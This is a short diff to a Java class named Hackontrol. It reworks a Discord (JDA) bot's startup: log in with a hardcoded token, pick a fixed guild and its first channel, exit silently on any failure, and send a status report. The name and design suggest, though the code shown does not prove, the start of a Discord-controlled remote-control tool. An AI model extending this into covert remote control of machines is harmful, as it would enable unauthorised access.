@@ -1,6 +1,6 @@
 package com.khopan.hackontrol;
 
-import java.util.Objects;
+import java.util.List;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -20,16 +20,39 @@ public class Hackontrol {
 	private final JDA bot;
 	private final Guild guild;
 	private final TextChannel channel;
+	private final Request request;
 
-	private Hackontrol() throws Throwable {
+	private Hackontrol() {
 		this.bot = JDABuilder.createDefault(Hackontrol.BOT_TOKEN)
 				.enableIntents(GatewayIntent.GUILD_MESSAGES)
 				.build();
 
-		this.bot.awaitReady();
-		this.guild = Objects.requireNonNull(this.bot.getGuildById(1173967259304198154L));
-		this.channel = Objects.requireNonNull(this.guild.getTextChannelById(1173967259862048891L));
-		this.channel.sendMessage("Hello, world!").queue();
+		try {
+			this.bot.awaitReady();
+		} catch(Throwable Errors) {
+			System.exit(1);
+		}
+
+		this.guild = this.bot.getGuildById(1173967259304198154L);
+
+		if(this.guild == null) {
+			System.exit(1);
+		}
+
+		List<TextChannel> channels = this.guild.getTextChannels();
+
+		if(channels.isEmpty()) {
+			System.exit(1);
+		}
+
+		this.channel = channels.get(0);
+
+		if(this.channel == null) {
+			System.exit(1);
+		}
+
+		this.request = new Request(this.channel);
+		this.request.statusReport(true);
 	}
 
 	public static void main(String[] args) throws Throwable {
